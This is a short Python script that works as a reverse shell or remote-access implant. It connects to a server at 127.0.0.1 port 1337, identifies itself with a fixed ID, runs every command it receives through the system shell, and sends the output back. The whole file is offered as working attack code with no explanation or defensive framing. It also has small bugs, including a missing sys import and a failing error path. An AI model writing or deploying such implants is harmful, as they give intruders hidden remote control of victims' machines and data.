import socket
import subprocess
import json 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1337)); 
s.send(json.dumps({"sock_id": "5ee0db8e0cbc543e2cedaab6"}).encode('utf-8')); 
while(True): 
    command = s.recv(1024)
    command = str(command, "utf8")
    if(command == "exit"): 
        s.close() 
        sys.exit()
        break
    try: 
        command_output = subprocess.check_output(command, shell=True)
    except: 
        command_output = "Wrong Command"
    some = {"by": "5ee0db8e0cbc543e2cedaab6", "output": str(command_output, "utf8")}; 
    some = json.dumps(some).encode('utf-8')
    s.send(some)